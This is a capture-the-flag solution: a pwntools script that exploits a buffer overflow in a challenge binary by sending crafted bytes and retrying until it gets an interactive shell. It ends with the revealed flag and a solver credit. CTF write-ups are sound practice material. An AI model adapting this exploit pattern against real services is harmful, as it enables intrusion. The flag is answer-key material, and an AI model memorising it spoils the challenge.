# Solution

```
from pwn import *

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

def start():
    if args.GDB:
        return gdb.debug([exe], gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    else:
        return process(exe)

gdbscript = '''
init-pwndbg
b main
breakrva
p &board
continue
'''

while True:
    try:
        io = start()

        io.sendline(b'\xc9')
        io.sendline(b'\x4f')

        for _ in range(16):
            io.sendline(b'0')
        for _ in range(17):
            io.sendline(b'1')

        io.sendline(b'9')

        io.interactive()

    except EOFError:
        try:
            io.close()
        except:
            pass
```

flag: `grey{i_l0v3_mE_s0M3_bUfFeR_0v3rFloWS}`

Solved by: w6rstmvn
